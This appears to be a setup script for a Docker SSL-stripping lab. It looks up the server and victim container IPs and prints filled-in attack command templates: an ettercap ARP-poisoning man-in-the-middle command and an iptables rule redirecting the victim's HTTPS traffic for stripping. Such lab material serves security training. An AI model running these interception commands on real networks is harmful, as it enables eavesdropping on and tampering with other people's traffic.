#!/bin/bash

echo ""
echo "🎯 SSL STRIPPING LAB - CONTAINER IPS:"
echo "=================================="

# Wait for containers to be fully running
echo "⏳ Waiting for containers to initialize..."
sleep 15

# Get container IPs
SERVER_IP=$(docker inspect blueledger_server 2>/dev/null | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress' 2>/dev/null || echo 'Not running')
VICTIM_IP=$(docker inspect ssl_victim 2>/dev/null | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress' 2>/dev/null || echo 'Not running')

echo "📱 BlueLedger Server: $SERVER_IP"
echo "🎭 SSL Victim: $VICTIM_IP"
echo ""

# Show access URLs if server is running
if [ "$SERVER_IP" != "Not running" ] && [ "$SERVER_IP" != "null" ]; then
    echo "🌐 Access URLs:"
    echo "   Frontend:  http://$SERVER_IP:3000"
    echo "   HTTP API:  http://$SERVER_IP:5000"
    echo "   HTTPS API: https://$SERVER_IP:5001"
    echo ""
fi

echo "🔓 Ready for SSL Stripping Attack!"
echo "Use these IPs in your ettercap and iptables commands."
echo "=================================="
echo ""

# Show quick ettercap command template
if [ "$SERVER_IP" != "Not running" ] && [ "$VICTIM_IP" != "Not running" ] && [ "$SERVER_IP" != "null" ] && [ "$VICTIM_IP" != "null" ]; then
    GATEWAY=$(ip route | grep default | head -1 | awk '{print $3}')
    echo "💡 Quick SSL Stripping Commands:"
    echo "   ettercap: sudo ettercap -T -M arp:remote /$VICTIM_IP// /$GATEWAY//"
    echo "   iptables: sudo iptables -t nat -A PREROUTING -s $VICTIM_IP -p tcp --dport 5001 -j REDIRECT --to-port 8080"
    echo ""
fi